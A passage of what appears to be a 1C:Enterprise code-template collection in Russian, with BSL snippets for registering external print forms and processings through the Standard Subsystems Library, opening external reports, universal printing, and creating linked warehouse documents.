	НоваяКоманда.Идентификатор = Идентификатор;
	НоваяКоманда.Использование = Использование;
	НоваяКоманда.ПоказыватьОповещение = ПоказыватьОповещение;
	НоваяКоманда.Модификатор = Модификатор;
	
КонецПроцедуры

Процедура ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначения, СозданныеОбъекты) Экспорт
	
	
	
КонецПроцедуры
"}
},
{0,
{"Подключение обработки через БСП",0,0,"","//************************************************************
// Создает в таблице команд новую строку
Функция ДобавитьКоманду(ТаблицаКоманд, Представление, Идентификатор, Использование, ПоказыватьОповещение = Ложь, Модификатор = """", ЗаменяемыеКоманды = """")
	
	НоваяКоманда 						= ТаблицаКоманд.Добавить();
	НоваяКоманда.Представление 			= Представление;
	НоваяКоманда.Идентификатор 			= Идентификатор;
	НоваяКоманда.Использование 			= Использование;
	НоваяКоманда.ПоказыватьОповещение 	= ПоказыватьОповещение;
	НоваяКоманда.Модификатор 			= Модификатор;
	НоваяКоманда.ЗаменяемыеКоманды 		= ЗаменяемыеКоманды;
	
КонецФункции

//************************************************************
// Вызываться программой, при добавлении файла внешней обработки в справочник.
Функция СведенияОВнешнейОбработке() Экспорт
	
	//Данные для заполнения сведений об обработке:
	ЭтотОбъектМетаданные 	= ЭтотОбъект.Метаданные();
	НаименованиеОбработки 	= ЭтотОбъектМетаданные.Синоним;	// Возьмем из синонима
	
	ЭтотОбъектМетаданныеКомментарий = ЭтотОбъектМетаданные.Комментарий;
	КомментарийМассив 				= СтрРазделить(ЭтотОбъектМетаданныеКомментарий, "","");
	ВерсияОбработки 				= СтрЗаменить(КомментарийМассив[0], ""v"", """"); 	// Возьмем из комментария
	ИнформацияПоОбрабтке 			= НаименованиеОбработки + "" (внешняя)"";	// описание
	
	//Массив назначений
	МассивНазначений 	= Новый Массив;
	УказанныеТипы 		= ЭтотОбъектМетаданные.Реквизиты.СсылкаНаДокумент.Тип.Типы();      // Возьмем типы из реквизита ""СсылкаНаДокумент""
	Для Каждого УказанныйТип ИЗ УказанныеТипы Цикл
		ОбъектМетаданных = Метаданные.НайтиПоТипу(УказанныйТип);
		Если ОбъектМетаданных <> Неопределено Тогда
			МассивНазначений.Добавить(""Документ."" + ОбъектМетаданных.Имя);
		КонецЕсли;	
	КонецЦикла;	
	
	ПараметрыРегистрации 					= ДополнительныеОтчетыИОбработки.СведенияОВнешнейОбработке(""2.4.6.167"");
	
	//Добавляемые команды на формы документов
	Использование = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	
	ДобавитьКоманду(ПараметрыРегистрации.Команды, НаименованиеОбработки, ""ПФ_MXL_ИНВ3"", Использование, Истина, ""ПечатьMXL"", ""ИНВ3"");
	
	ПараметрыРегистрации.Вид 				= ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиПечатнаяФорма(); // Варинаты: ЗаполнениеОбъекта, ДополнительныйОтчет, СозданиеСвязанныхОбъектов... 
	ПараметрыРегистрации.Назначение 		= МассивНазначений; 		// Массив документов, обрабатываемых обработкой
	ПараметрыРегистрации.Наименование 		= НаименованиеОбработки; 	// Имя под которым обработка будет зарегестрирована в справочнике внешних обработок
	ПараметрыРегистрации.Версия 			= ВерсияОбработки; 			// Версия обработки, которая будет отображаться в справочнике внешних обработок
	ПараметрыРегистрации.БезопасныйРежим 	= Ложь;						// Состояние безопасного режима
	ПараметрыРегистрации.Информация 		= ИнформацияПоОбрабтке; 	// Описание обработки для пользователя
	
	Возврат ПараметрыРегистрации;
	
КонецФункции // СведенияОВнешнейОбработке()
"}
},
{0,
{"Подключение обработки через БСП коротко",0,0,"","Функция СведенияОВнешнейОбработке() Экспорт
		
	ПараметрыРегистрации 			= ДополнительныеОтчетыИОбработки.СведенияОВнешнейОбработке(""2.2.2.1"");
	ПараметрыРегистрации.Вид 		= ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиДополнительныйОтчет();
	ПараметрыРегистрации.Версия 	= ""1.0"";
	ПараметрыРегистрации.Вставить 	= ""Карточка-справка (0504417) с учетом физ лица"";
	
	Команда 						= ПараметрыРегистрации.Команды.Добавить();
	Команда.Представление 			= НСтр(""ru = 'Карточка-справка (0504417) с учетом физ лица'"");
	Команда.Идентификатор 			= ""КарточкаСправка0504417с2015"";
	Команда.Использование 			= ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	Команда.ПоказыватьОповещение 	= Ложь;
	
	Возврат ПараметрыРегистрации; 
	
КонецФункции"}
},
{0,
{"ПутьКОбработке",0,0,"ПутьКОбр[аботке]","//ПутьКОбработке = ПолучитьПутьКОбработке();
&НаСервере
Функция ПолучитьПутьКОбработке()
	
	ОбработкаОбъект 	= РеквизитФормыВЗначение(""Объект"");
	ПутьКОбработке 		= ОбработкаОбъект.Метаданные().ПолноеИмя();
	
	Возврат ПутьКОбработке;
	
КонецФункции // ПолучитьПутьКОбработке()"}
},
{0,
{"СведенияОВнешнейОбработке",0,0,"","// Возвращает сведения о внешней обработке.
Функция СведенияОВнешнейОбработке() Экспорт
	
	ПараметрыРегистрации = ДополнительныеОтчетыИОбработки.СведенияОВнешнейОбработке();
	
	ПараметрыРегистрации.Вид 		= ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиДополнительнаяОбработка();
	ПараметрыРегистрации.Версия 	= ""1.0"";
	
	НоваяКоманда = ПараметрыРегистрации.Команды.Добавить();
	НоваяКоманда.Представление 				= НСтр(""ru = 'Регламентная задача'"");
	НоваяКоманда.Идентификатор 				= ""РегЗадача"";
	НоваяКоманда.Использование 				= ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.ПоказыватьОповещение 		= Истина;
	
	Возврат ПараметрыРегистрации;
	
КонецФункции // СведенияОВнешнейОбработке()

// Интерфейс для запуска логики обработки.
Процедура ВыполнитьКоманду(ИмяКоманды, ПараметрыВыполнения) Экспорт
	
	// Диспетчеризация обработчиков команд.
	Если ИмяКоманды = ""РегЗадача"" Тогда
		ВыполнитьРегЗадание(ПараметрыВыполнения);
	КонецЕсли;
	
КонецПроцедуры"}
},
{0,
{"СведенияОВнешнейОбработке по метаданным",0,0,"","Функция СведенияОВнешнейОбработке() Экспорт

	//Данные для заполнения сведений об обработке:
	ЭтотОбъектМетаданные 	= ЭтотОбъект.Метаданные();
	НаименованиеОбработки 	= ЭтотОбъектМетаданные.Синоним; 					// Возьмем из синонима
	
	ЭтотОбъектМетаданныеКомментарий = ЭтотОбъектМетаданные.Комментарий;
	КомментарийМассив 				= СтрРазделить(ЭтотОбъектМетаданныеКомментарий, "","");
	ВерсияОбработки 				= СтрЗаменить(КомментарийМассив[0], ""v"", """");	// Возьмем из комментария
	ИнформацияПоОбрабтке 			= ""Внешняя печатная форма"";						// Произвольное описание
	
	//Массив назначений
	МассивНазначений 	= Новый Массив;
	УказанныеТипы 		= ЭтотОбъектМетаданные.Реквизиты.СсылкаНаДокумент.Тип.Типы();	// Возьмем типы из реквизита ""Документ""
	Для Каждого УказанныйТип ИЗ УказанныеТипы Цикл
		ОбъектМетаданных = Метаданные.НайтиПоТипу(УказанныйТип);
		Если ОбъектМетаданных <> Неопределено Тогда
			МассивНазначений.Добавить(""Документ."" + ОбъектМетаданных.Имя);
		КонецЕсли;	
	КонецЦикла;	
	
	//Заполняем структуру сведений
	//	1. Вид - вид обработки.
	//	Тип данных - строка, допустимо одно из 6 значений.
	//	Значения.
	//	1) Глобальные - ""ДополнительнаяОбработка"", ""ДополнительныйОтчет""
	//	2) Назначаемые - ""ЗаполнениеОбъекта"", ""Отчет"", ""ПечатнаяФорма"" или ""СозданиеСвязанныхОбъектов"".
	
	//	2. Назначение - объект, для которого назначается данная обработка, 
	//	Массив строк имен объектов метаданных.
	//	Примеры значений массива - ""Документ.АвансовыйОтчет"" или ""Справочник.*"", где * - означает все объекта данного вида.
	//	Для глобальных (не назначаемых) обработок параметр не имеет смысла.
	
	//	3. Наименование - название обработки, произвольное наименование
	//	Тип данных - произвольная строка.
	//	Данное наименование будет отображаться в списке дополнительных обработок.
	
	//	4. Версия - номер версии обработки
	//	Тип данных - строка в формате ""ХХ.ХХ"".
	//	Обозначает версию данной обработки, данная версия будет отображаться в списке дополнительных отчетов и обработок.
	
	//	5. БезопасныйРежим - режим контроля прав пользователя.
	//	Тип данных - булево.
	
	//	6. Информация - краткое описание обработки.
	//	Тип данных - строка.
	//	Данное описание будет отображаться в списке дополнительных обработок.
	
	//	7. Команды - действия предоставляемые обработкой.
	//	Тип данных - таблица значений.
	//	Таблица содержит 5 колонок:
	//	1) Представление. Наименование команды в пользовательском интерфейсе;
	//	2) Идентификатор. Для печатных форм список макетов, для остальных обработок любая строка, уникальная для данной обработки.
	//	3) Использование. Строка, одно из значений - 
	//		- ОткрытиеФормы. Открывает форму обработки.
	//		- ВызовКлиентскогоМетода. Вызов клиентского экспортного метода модуля формы
	//		- ВызовСерверногоМетода. Вызов экспортного серверного метода модуля объекта.
	//		Для внешних печатных форм нужно указывать последнее значение.
	//	4) ПоказыватьОповещение. Булево, нужно ли показывать оповещение при начале и окончании действия.
	//	5) Модификатор. Для внешних печатных форм должно содержаться значение ""ПечатьMXL"".
	
	//Добавляемые команды на формы документов
	ТаблицаКоманд = ПолучитьТаблицуКоманд();
	ДобавитьКоманду(ТаблицаКоманд, НаименованиеОбработки, ""Идентификатор"", ""ВызовСерверногоМетода"", Истина, ""ПечатьMXL"");
	
	ПараметрыРегистрации = Новый Структура;
	ПараметрыРегистрации.Вставить(""Вид""				, ""ПечатнаяФорма""); 		// Варинаты: ЗаполнениеОбъекта, ДополнительныйОтчет, СозданиеСвязанныхОбъектов... 
	ПараметрыРегистрации.Вставить(""Назначение""		, МассивНазначений);  		// Массив документов, обрабатываемых обработкой
	ПараметрыРегистрации.Вставить(""Наименование""	, НаименованиеОбработки); 	// Имя под которым обработка будет зарегестрирована в справочнике внешних обработок
	ПараметрыРегистрации.Вставить(""Версия""			, ВерсияОбработки);         // Версия обработки, которая будет отображаться в справочнике внешних обработок
	ПараметрыРегистрации.Вставить(""БезопасныйРежим""	, Ложь);       				// Включение безопасного режима
	ПараметрыРегистрации.Вставить(""Информация""		, ИнформацияПоОбрабтке);	// Описание обработки для пользователя
	ПараметрыРегистрации.Вставить(""Команды""			, ТаблицаКоманд);        	// Таблица команд, добавляемых в систему
	Возврат ПараметрыРегистрации;
	
КонецФункции // СведенияОВнешнейОбработке()"}
},
{0,
{"ОткрытьВнешнОбработку",0,0,"","Процедура ОткрытьВнешнОбработку(йКод, Наименование = """")
	
	Если ПустаяСтрока(Наименование) Тогда
		спр = Справочники.ВнешниеОбработки.НайтиПоКоду(йКод);
	Иначе
		спр = Справочники.ВнешниеОбработки.НайтиПоНаименованию(Наименование);
	КонецЕсли;
	
	Если спр.Пустая() Тогда 
		Предупреждение(""Не найдена обработка с кодом "" + йКод); 
		Возврат; 
	КонецЕсли;
	
	ЭтоОбработка = Истина;
	ЭтоОтчет     = Ложь;
	
	Попытка
		ИмяФайла 		= ПолучитьИмяВременногоФайла();
		ДвоичныеДанные 	= спр.ХранилищеВнешнейОбработки.Получить();
		ДвоичныеДанные.Записать(ИмяФайла);
		Форма = ВнешниеОбработки.ПолучитьФорму(ИмяФайла);
		Если Не Форма = Неопределено Тогда
			Форма.Открыть();
		Конецесли;
	Исключение
		Предупреждение(""Выбранный файл не является внешней обработкой.
		|Либо, данная обработка не предназначена для
		|запуска в этой конфигурации."");
	КонецПопытки;
	
КонецПроцедуры"}
},
{0,
{"ОткрытьВнешнОбработку (из команды)",0,0,"","&НаКлиенте
Процедура ОбработкаКоманды(ПараметрКоманды, ПараметрыВыполненияКоманды)
	ОткрытьВнешнОбработку(""Карточка-справка (0504417)"", Истина);
КонецПроцедуры     

&НаКлиенте
Процедура ОткрытьВнешнОбработку(пНаименование, пЭтоОтчёт = Ложь)
    лОбработка = ОткрытьВнешнОбработкуСервер(пНаименование);
    ВыполняемаяКоманда = Новый Структура(
        ""Ссылка, Представление,
        |Идентификатор, ВариантЗапуска, ПоказыватьОповещение, 
        |Модификатор, ОбъектыНазначения, ЭтоОтчет, Вид"");
        
    ЗаполнитьЗначенияСвойств(ВыполняемаяКоманда, лОбработка);
        
    ВыполняемаяКоманда.Идентификатор 	=    Новый УникальныйИдентификатор;
    ВыполняемаяКоманда.ЭтоОтчет 		=    пЭтоОтчёт;
    ДополнительныеОтчетыИОбработкиКлиент.ВыполнитьОткрытиеФормыОбработки(ВыполняемаяКоманда, Неопределено, Неопределено);
КонецПроцедуры         

&НаСервере
Функция ОткрытьВнешнОбработкуСервер(пНаименование)
    лВнешняяОбработка 	=    Справочники.ДополнительныеОтчетыИОбработки.НайтиПоНаименованию(пНаименование);
    лСтруктура 			= Новый Структура;
    лСтруктура.Вставить(""Ссылка"", лВнешняяОбработка.Ссылка);
    лСтруктура.Вставить(""Вид""	, лВнешняяОбработка.Вид);
    Возврат лСтруктура;
КонецФункции"}
},
{0,
{"Печать ВПФ",0,0,"","ДеревоМакетовПечати = УниверсальныеМеханизмы.ПолучитьДеревоМакетовПечати(СсылкаНаДокумент, Неопределено); 

СтрокаКнопки = ДеревоМакетовПечати.Строки.Найти(""ИМЯ-ВАШЕГО-МАКЕТА"", ""Текст""); 

Расшифровка = СтрокаКнопки.Расшифровка; 
Если ТипЗнч(Расшифровка) = Тип(""Структура"") Тогда 
	ТабДокументСФ = УниверсальныеМеханизмы.НапечататьВнешнююФорму(СсылкаНаДокумент, Расшифровка); 
КонецЕсли;"}
},
{0,
{"Печать универсально",0,0,"","//+++====== Печать универсально [АйТи Кучеров Р 18.05.2018 ТЗ № ИС00-001738] ================================================

//Функция постарается напечатать средствами ВПФ и вернёт Истину, если всё удачно
//-------------------------------------------------------------------------
//Параметры:
//		НаименованиеОбработки - Строка - Представление обработки (имя)
//		ОбъектыНазначения - Массив - Объекты на печать
//		ПараметрыИсточникаИдентификаторКоманды - Строка - Идентификатор обработки
//Возвращаемое значение:
//		Булево - Истина, если была найдена ВПФ, иначе Ложь
//-------------------------------------------------------------------------
//автор: Кучеров Р 18.05.2018 
&НаКлиенте
Функция ПечатьВПФ(НаименованиеОбработки, ОбъектыНазначения, ПараметрыИсточникаИдентификаторКоманды)
	
	ВПФ = ДополнительныеОтчетыИОбработкиНайтиПоНаименованию(НаименованиеОбработки);
	Если ВПФ.Пустая() Тогда // Значит печать надо обычными средствами
		Возврат Ложь;
	КонецЕсли;
	
	// Печать через ВПФ 
	ПараметрыОткрытия 					= Новый Структура(""ИсточникДанных, ПараметрыИсточника"");
	ПараметрыОткрытия.ИсточникДанных 	= ВПФ;
	ПараметрыОткрытия.ПараметрыИсточника = Новый Структура(""ИдентификаторКоманды, ОбъектыНазначения"");
	ПараметрыОткрытия.ПараметрыИсточника.ИдентификаторКоманды 	= ПараметрыИсточникаИдентификаторКоманды;
	ПараметрыОткрытия.ПараметрыИсточника.ОбъектыНазначения 		= ОбъектыНазначения;
	ОткрытьФорму(""ОбщаяФорма.ПечатьДокументов"", ПараметрыОткрытия);
	
	Возврат Истина;
	
КонецФункции

&НаСервереБезКонтекста
Функция ДополнительныеОтчетыИОбработкиНайтиПоНаименованию(пНаименованиеОбработки)
	лДополнительныеОтчетыИОбработки = Справочники.ДополнительныеОтчетыИОбработки.НайтиПоНаименованию(пНаименованиеОбработки);
	Возврат лДополнительныеОтчетыИОбработки;
КонецФункции

//Функция 
//-------------------------------------------------------------------------
//Параметры:
//		НаименованиеОбработки - Тип - описание
//		ИмяМенеджераПечати - Тип - ""Документ."" + ""АктВыполненныхРабот""
//		ОбъектыНазначения - Массив - описание
//		ПараметрыИсточникаИдентификаторКоманды - Строка - описание
//-------------------------------------------------------------------------
//автор: Кучеров Р 18.05.2018 
&НаКлиенте
Процедура ПечатьДокумента(НаименованиеОбработки, ИмяМенеджераПечати, ОбъектыНазначения, ПараметрыИсточникаИдентификаторКоманды)
	
	НапечатаноЧерезВПФ = ПечатьВПФ(НаименованиеОбработки, ОбъектыНазначения, ПараметрыИсточникаИдентификаторКоманды);
	Если НЕ НапечатаноЧерезВПФ Тогда
		ИменаМакетов			= ПараметрыИсточникаИдентификаторКоманды; 
		МассивОбъектов			= ОбъектыНазначения;
		ВладелецФормы			= ЭтаФорма;
		ПараметрыПечати			= Неопределено; 
		УправлениеПечатьюКлиент.ВыполнитьКомандуПечати(ИмяМенеджераПечати, ИменаМакетов, МассивОбъектов, ВладелецФормы, ПараметрыПечати);
	КонецЕсли; 
	
КонецПроцедуры

//Функция 
//-------------------------------------------------------------------------
//Параметры:
//		Идентификатор - Тип - описание
//		ИмяМенеджераПечати - Тип - ""Документ."" + ""АктВыполненныхРабот""
//		ИмяФормы - Строка - ""Документ.АктВыполненныхРабот.Форма.ФормаДокумента""
//		МассивОбъектов - Массив - описание
//Возвращаемое значение:
//		Тип - описание
//-------------------------------------------------------------------------
//автор: Кучеров Р 18.05.2018 
&НаКлиенте
Процедура ПечатьУниверсально(Идентификатор, ИмяМенеджераПечати, ИмяФормы, МассивОбъектов)
	
	Представление = ПолучитьПредставлениеКоманды(ИмяФормы, Идентификатор); 
	
	Если Представление <> Неопределено Тогда
		ПечатьДокумента(Представление, ИмяМенеджераПечати, МассивОбъектов, Идентификатор);
	КонецЕсли; 
	
КонецПроцедуры

//Функция ПолучитьПредставлениеКоманды
//-------------------------------------------------------------------------
//Параметры:
//		ИмяФормы - Строка - Вида: ""Документ.АктВыполненныхРабот.Форма.ФормаДокумента"" 
//		Идентификатор - Строка - Вида: ""АктОбОказанииУслуг"", ""ПФ_MXL_Акт"" 
//Возвращаемое значение:
//		Строка - Представление КомандыПечати
//-------------------------------------------------------------------------
//автор: Кучеров Р 18.05.2018 
&НаСервереБезКонтекста
Функция ПолучитьПредставлениеКоманды(ИмяФормы, Идентификатор)
	
	КомандыПечати 	= ПолучитьКомандыПечати(ИмяФормы);
	
	ПараметрыОтбора = Новый Структура;
	ПараметрыОтбора.Вставить(""Идентификатор"", Идентификатор);
	ПараметрыОтбора.Вставить(""Отключена"", Ложь);
	НайденныеСтроки = КомандыПечати.НайтиСтроки(ПараметрыОтбора);
	Если ЗначениеЗаполнено(НайденныеСтроки) Тогда
		СтрокаТЗ = НайденныеСтроки[0];
	КонецЕсли;
	
	Если СтрокаТЗ <> Неопределено Тогда
		Представление = СтрокаТЗ.Представление;
	Иначе
		Представление = Неопределено;
	КонецЕсли; 
	
	Возврат Представление
	
КонецФункции // ПолучитьПредставлениеКоманды()

&НаСервереБезКонтекста
Функция ПолучитьКомандыПечати(ИмяФормы)
	Возврат УправлениеПечатьюПовтИсп.КомандыПечатиФормы(ИмяФормы).Скопировать();
КонецФункции // ПолучитьКомандыПечати()

//---====== Печать универсально [АйТи Кучеров Р 18.05.2018 ТЗ № ИС00-001738] ================================================ 

//Функция ЗаполнитьСписокВыбораКомандамиПечати
//-------------------------------------------------------------------------
//Параметры:
//		ИмяФормы - Строка - Вида ""Документ.АктВыполненныхРабот.Форма.ФормаДокумента""
//		СписокЗначенийПечати - Элементы.СписокЗначенийПечатиАкта.СписокВыбора - СписокВыбора на форме
//		ВернутьИндексЗаданногоИмени - Булево - Вернуть индекс элемента с именем в параметре ""ЗаданноеИмяДляВозвратаИндекса""
//		ЗаданноеИмяДляВозвратаИндекса - Строка - Элемент для поиска индекса
//Возвращаемое значение:
//		Число - Индекс
//-------------------------------------------------------------------------
//автор: Кучеров Р 18.05.2018
&НаСервере
Функция ЗаполнитьСписокВыбораКомандамиПечати(ИмяФормы, СписокЗначенийПечати, ВернутьИндексЗаданногоИмени = Ложь, ЗаданноеИмяДляВозвратаИндекса = """")
	
	Если ПустаяСтрока(ИмяФормы) Тогда
		Возврат 0;
	КонецЕсли;
	
	КомандыПечати 	= ПолучитьКомандыПечати(ИмяФормы);
	
	ПараметрыОтбора = Новый Структура;
	ПараметрыОтбора.Вставить(""Отключена"", Ложь);
	АктуальныеКомандыПечати = КомандыПечати.НайтиСтроки(ПараметрыОтбора);
	
	ИндексЗаданногоИмени = 0; 
	
	Индекс = 0;
	Для каждого ЭлМасс Из АктуальныеКомандыПечати Цикл
		
		Представление = ЭлМасс.Представление;
		Идентификатор = ЭлМасс.Идентификатор;
		
		Если ВернутьИндексЗаданногоИмени Тогда
			Если Представление = ЗаданноеИмяДляВозвратаИндекса  Тогда
				ИндексЗаданногоИмени = Индекс;
			КонецЕсли; 
		КонецЕсли; 
		
		СписокЗначенийПечати.Добавить(Идентификатор, Представление);
		
		Индекс = Индекс + 1;
		
	КонецЦикла;
	
	Возврат ИндексЗаданногоИмени;
	
КонецФункции // ЗаполнитьСписокВыбораКомандамиПечати()

Акт_ИмяФормы 	= ""Документ.АктВыполненныхРабот.Форма.ФормаДокумента"";
ИндексИскомого 	= ЗаполнитьСписокВыбораКомандамиПечати(Акт_ИмяФормы, Элементы.СписокЗначенийПечатиАкта.СписокВыбора, Истина, ""Акт об оказании услуг"");
СписокЗначенийПечатиАкта 	= Элементы.СписокЗначенийПечатиАкта.СписокВыбора[ИндексИскомого].Значение;"}
},
{0,
{"Создать на основании",0,0,"","//Не все знают, что конфигурации на основе БСП (УТ 11, БП 3.0, ЗУП 3.0 и т.д.) имеют механизм, который позволяет создавать связанные объекты, что в какой-то мере является аналогом создания на основании.
//Понятно, что многие гуру знают об этой возможности, но статья все же не для них. Предупреждаю сразу. :)

//Есть разные виды внешних отчетов и обработок:

//// Вид - строка - возможные значения: ""ДополнительнаяОбработка""
//// ""ДополнительныйОтчет""
//// ""ЗаполнениеОбъекта""
//// ""Отчет""
//// ""ПечатнаяФорма""
//// ""СозданиеСвязанныхОбъектов""

//Поговорим о последнем виде... Как оказалось - это достаточно мощная возможность добавить новый функционал без необходимости непосредственного изменения конфигурации. Лучше всего рассмотрим на примере:

//Мне была поставлена следующая задача.

//Задача: Есть УТ 11, с одним складом и несколькими складскими помещениями и ордерной схемой работы. При закупке имеем следующее:

//Заказ поставщику → Поступление товаров → Приходный ордер (центральное помещение) → [?] Перемещение (в другие помещения)

//И все бы хорошо, но на последнем шаге, после того, как товар будет оприходован в центральное помещение, его начинают перемещать в другие помещения в рамках одного склада. Т.е. документ ""Перемещение товаров"" не сделать, все необходимо делать с помощью ""Ордера на перемещение товаров"", который выпадает из схемы закупки. И так получается, что этот документ нельзя создать на основании ""Приходного ордера"", или документа ""Поступление товаров"". Подходим к вопросу о том, как это сделать.

//Необходимо: Добавить возможность создания документа ""Ордер на перемещение товаров"" на основании ""Приходного ордера"".

Функция СведенияОВнешнейОбработке() Экспорт
	
	ПараметрыРегистрации = Новый Структура;
	
	// Добавим куда нужно вставить возможность создания на основании
	МассивНазначений = Новый Массив;
	МассивНазначений.Добавить(""Документ.ПриходныйОрдерНаТовары"");
	
	ПараметрыРегистрации.Вставить(""Вид""             , ""СозданиеСвязанныхОбъектов"");
	ПараметрыРегистрации.Вставить(""Назначение""      , МассивНазначений);
	ПараметрыРегистрации.Вставить(""Наименование""    , ""Создать ордер на перемещение товаров на основании приходного ордера"");
	ПараметрыРегистрации.Вставить(""Версия""          , ""1.0"");
	ПараметрыРегистрации.Вставить(""БезопасныйРежим"" , Истина);
	ПараметрыРегистрации.Вставить(""Информация""      , ""Дополнительная обработка"");
	
	ТаблицаКоманд = ПолучитьТаблицуКоманд();
	
	// Добавим команду
	ДобавитьКоманду(
	ТаблицаКоманд,
	""Ордер на перемещение товаров"",
	""Ордер на перемещение товаров"",
	""ВызовКлиентскогоМетода"",
	Истина
	);
	
	ПараметрыРегистрации.Вставить(""Команды"", ТаблицаКоманд);
	
	Возврат ПараметрыРегистрации;
	
КонецФункции

Функция ПолучитьТаблицуКоманд()
	
	Команды = Новый ТаблицаЗначений;
	Команды.Колонки.Добавить(""Представление""        , Новый ОписаниеТипов(""Строка""));
	Команды.Колонки.Добавить(""Идентификатор""        , Новый ОписаниеТипов(""Строка""));
	Команды.Колонки.Добавить(""Использование""        , Новый ОписаниеТипов(""Строка""));
	Команды.Колонки.Добавить(""ПоказыватьОповещение"" , Новый ОписаниеТипов(""Булево""));
	Команды.Колонки.Добавить(""Модификатор""          , Новый ОписаниеТипов(""Строка""));
	
	Возврат Команды;
	
КонецФункции

Процедура ДобавитьКоманду(ТаблицаКоманд, Представление, Идентификатор, Использование, ПоказыватьОповещение = Истина, Модификатор = """")
	
	НоваяКоманда                      = ТаблицаКоманд.Добавить();
	НоваяКоманда.Представление        = Представление;
	НоваяКоманда.Идентификатор        = Идентификатор;
	НоваяКоманда.Использование        = Использование;
	НоваяКоманда.ПоказыватьОповещение = ПоказыватьОповещение;
	НоваяКоманда.Модификатор          = Модификатор;
	
КонецПроцедуры
Добавляем форму, в которой описываем перезаполнение:

&НаКлиенте
Процедура ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначенияМассив, СозданныеОбъекты) Экспорт
	
	//Переберем все выбранные документы на основании, которых будет созданы другие новые документы
	Для каждого Элемент из ОбъектыНазначенияМассив Цикл    
		
		//Получая форму объекта создаваемого документа
		ФормаДок = ПолучитьФорму(""Документ.ОрдерНаПеремещениеТоваров.ФормаОбъекта""); 
		
		//Далее мы получаем объект только, что созданной формы и помещаем её в переменную
		//В объекте содержатся все реквизиты (элементы) формы
		ДанныеФормы = ФормаДок.Объект; 
		
		//Мы помещаем объект формы в переменную, 
		//так как должны передать её в процедуру на сервере,
		//где нельзя изменять объект формы, зато можно править переменную содержащую его
		СоздатьНовыйДокумент(Элемент, ДанныеФормы);
		
		//После выполнения процедуры на сервере мы получаем изменную переменную ДанныеФормы,
		//которую необходимо передать в уже созданную нами форму
		КопироватьДанныеФормы(ДанныеФормы, ФормаДок.Объект);
		
		//Открываем результат выполнения обработки
		ФормаДок.Открыть();
		
	КонецЦикла;    
	
КонецПроцедуры

&НаСервере
Процедура СоздатьНовыйДокумент(Элемент, НовыйОбъект)
	
	// Заполняем
	Основание             = Элемент.Ссылка;
	
	НовыйОбъект.Дата         = ТекущаяДата();
	НовыйОбъект.Склад         = Основание.Склад; 
	НовыйОбъект.ПомещениеОтправитель= Основание.Помещение; 
	
	// Переносим строки
	Для каждого СтрокаТЧ из Основание.Товары Цикл
		ЗаполнитьЗначенияСвойств(НовыйОбъект.Товары.Добавить(), СтрокаТЧ);
	КонецЦикла;
	
КонецПроцедуры"}
},
{0,
{"При помощи БСП программно открыть внешний отчет/обработку",0,0,"","1С 8.3 Как при помощи БСП программно открыть внешний отчет из ""Дополнительные отчеты и обработки"" и передать параметры
https://www.e-du.ru/2018/03/1c-open-ext-report.html

// имя внешней обработки - ВнешняяОбработкаПример  (в допобработках)
// имя внешнего отчета - ВнешнийОтчетСКДПример  (в допобработках)
// во внешнем отчете/обработке, даже если это СКД, должна быть создана форма
// (для СКД - это стандартная форма отчета по умолчанию)

// Открытие внешней обработки без параметров 
&НаКлиенте
Процедура ОткрытьВнешнююОбработку(Команда)
    ОткрытьВнешнийОтчетОбработкуПоИмениСДопПараметрами (""ВнешняяОбработкаПример"", Неопределено, Ложь); 
КонецПроцедуры

// Открытие внешней обработки с передачей параметров
&НаКлиенте
Процедура ОткрытьВнешнююОбработкуСПараметром(Команда)
    ПараметрыОбработки = Новый Структура;
    ПараметрыОбработки.Вставить(НазваниеПараметра, ЗначениеПараметра);
    ОткрытьВнешнийОтчетОбработкуПоИмениСДопПараметрами (""ВнешняяОбработкаПример"", ПараметрыОбработки, Ложь);
КонецПроцедуры

// Открытие внешнего отчета СКД без параметров 
&НаКлиенте
Процедура ОткрытьВнешнийОтчетСКД(Команда)
    ОткрытьВнешнийОтчетОбработкуПоИмениСДопПараметрами (""ВнешнийОтчетСКДПример"", Неопределено, Истина);
КонецПроцедуры

// Открытие внешнего отчета СКД с передачей параметров
&НаКлиенте
Процедура ОткрытьВнешнийОтчетСКДсПараметром(Команда)  
    ПользовательскиеНастройки = Новый ПользовательскиеНастройкиКомпоновкиДанных;
    ПользовательскиеНастройки.ДополнительныеСвойства.Вставить(НазваниеПараметра, ЗначениеПараметра);
    // добавляем другие нужные параметры по желанию
    //ПользовательскиеНастройки.ДополнительныеСвойства.Вставить(НазваниеПараметра2, ЗначениеПараметра2);
    //ПользовательскиеНастройки.ДополнительныеСвойства.Вставить(""Период"", Новый СтандартныйПериод(ДатаНачала,ДатаОкончания));   
    ПараметрыОтчета = Новый Структура;
    ПараметрыОтчета.Вставить(""СформироватьПриОткрытии"", Истина);
    ПараметрыОтчета.Вставить(""КлючВарианта"", ""ФормированиеПоПараметрам"");
    ПараметрыОтчета.Вставить(""ПользовательскиеНастройки"", ПользовательскиеНастройки);   
    ОткрытьВнешнийОтчетОбработкуПоИмениСДопПараметрами (""ВнешнийОтчетСКДПример"", ПараметрыОтчета, Истина);
КонецПроцедуры

// процедура, открывающая отчет/обработку по имени, заданному в допобработках
&НаКлиенте
Процедура ОткрытьВнешнийОтчетОбработкуПоИмениСДопПараметрами(ИмяОтчетаОбработки, ПараметрыОткрытия, ЭтоОтчет, РодительскаяФорма = Неопределено)
    ВнешнийОтчетОбработкаДляОткрытияСсылка = ПолучитьСсылкуНаВнешнийОтчетОбработкуПоИмениНаСервере (ИмяОтчетаОбработки);  
     // ВЫЗОВ ИЗ БСП ФУНКЦИИ ПОДКЛЮЧЕНИЯ ВНЕШНЕЙ ОБРАБОТКИ
    ИмяОбработкиСлужебное = ДополнительныеОтчетыИОбработкиВызовСервера.ПодключитьВнешнююОбработку(ВнешнийОтчетОбработкаДляОткрытияСсылка);
    Если ЭтоОтчет Тогда
        ОткрытьФорму(""ВнешнийОтчет."" + ИмяОбработкиСлужебное + "".Форма"", ПараметрыОткрытия, РодительскаяФорма);
    Иначе
